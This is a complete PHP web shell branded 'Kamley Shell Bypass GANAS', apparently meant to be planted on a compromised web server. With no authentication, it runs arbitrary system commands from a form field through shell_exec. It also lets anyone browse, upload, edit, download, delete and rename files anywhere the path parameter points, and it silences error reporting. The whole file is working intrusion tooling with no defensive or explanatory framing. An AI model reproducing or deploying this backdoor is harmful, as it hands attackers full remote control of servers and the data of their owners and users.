<?php
error_reporting(0);
@ini_set('display_errors', 0);

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($cwd);

function h_call($c) {
    return shell_exec($c);
}
function h_ls($p) {
    return scandir($p);
}
function h_rm($f) {
    return unlink($f);
}
function h_mv($a, $b) {
    return rename($a, $b);
}
function h_upload($f) {
    return move_uploaded_file($f['tmp_name'], './' . basename($f['name']));
}
function h_mkdir($d) {
    return mkdir($d);
}

echo "<style>
    body { font-family: monospace; background:#111; color:#0f0; padding:10px; }
    input, select, textarea { background:#000; color:#0f0; border:1px solid #0f0; }
    a { color:#0f0; text-decoration:none; margin:0 5px; }
    form { margin-bottom:10px; }
    hr { border-color:#0f0; }
</style>";

echo "<h2> Kamley Shell Bypass GANAS</h2>";
echo "<p><b>Current Dir:</b> $cwd</p>";

echo "<form method='GET'>
Change Dir: <input name='path' value='$cwd' style='width:300px;'><input type='submit' value='Go'>
</form>";

echo "<form method='POST'>
Cmd: <input name='x' style='width:300px;'><input type='submit' value='Execute'>
</form>";

if ($_POST['x']) {
    echo "<pre>" . h_call($_POST['x']) . "</pre>";
}

echo "<hr><h3>Upload File</h3>
<form method='POST' enctype='multipart/form-data'>
<input type='file' name='up'><input type='submit' value='Upload'></form>";

if ($_FILES['up']) {
    echo h_upload($_FILES['up']) ? "✅ Upload success!" : "❌ Upload failed!";
}

echo "<hr><h3>Create Directory</h3>
<form method='POST'>
<input name='mkdir' placeholder='New folder name'>
<input type='submit' value='Create'>
</form>";

if ($_POST['mkdir']) {
    echo h_mkdir($_POST['mkdir']) ? "✅ Folder created!" : "❌ Failed to create!";
}

// FILE EDITOR
if (isset($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    if (is_file($fileToEdit)) {
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_content'])) {
            file_put_contents($fileToEdit, $_POST['new_content']);
            echo "<p>✅ File saved!</p>";
        }
        $contents = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<hr><h3>Editing File: <code>$fileToEdit</code></h3>";
        echo "<form method='POST'>
            <textarea name='new_content' rows='20' cols='100'>$contents</textarea><br>
            <input type='submit' value='💾 Save'>
        </form>";
    } else {
        echo "<p>❌ Not a file or doesn’t exist!</p>";
    }
}

echo "<hr><h3>File List</h3><ul>";
$files = h_ls('.');
foreach ($files as $f) {
    if ($f == '.') continue;
    $path = realpath($f);
    $size = is_file($f) ? filesize($f) : '-';
    $time = date("Y-m-d H:i:s", filemtime($f));
    $furl = urlencode($f);
    echo "<li>$f [$size bytes, $time] - ";
    if (is_dir($f)) {
        echo "<a href='?path=$path'>Open</a>";
    } else {
        echo "<a href='?dl=$furl'>Download</a> | 
              <a href='?cat=$furl'>View</a> | 
              <a href='?edit=$furl'>Edit</a>";
    }
    echo " | <a href='?rm=$furl' onclick='return confirm(\"Delete $f?\")'>Delete</a> | 
    <form style='display:inline' method='POST'>
        <input type='hidden' name='old' value='$f'>
        Rename: <input name='new' value='$f' style='width:100px;'>
        <input type='submit' name='ren' value='Rename'>
    </form>
    </li>";
}
echo "</ul>";


// File download
if ($_GET['dl']) {
    $fn = $_GET['dl'];
    header("Content-Disposition: attachment; filename=\"$fn\"");
    readfile($fn);
    exit;
}

// File viewer
if ($_GET['cat']) {
    echo "<hr><h3>Viewing File: " . htmlspecialchars($_GET['cat']) . "</h3><pre>";
    echo htmlspecialchars(file_get_contents($_GET['cat']));
    echo "</pre>";
}

// File delete
if ($_GET['rm']) {
    h_rm($_GET['rm']);
    header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($cwd));
    exit;
}

// Rename
if ($_POST['ren']) {
    h_mv($_POST['old'], $_POST['new']);
    header("Location: ".$_SERVER['PHP_SELF']."?path=".urlencode($cwd));
    exit;
}
?>
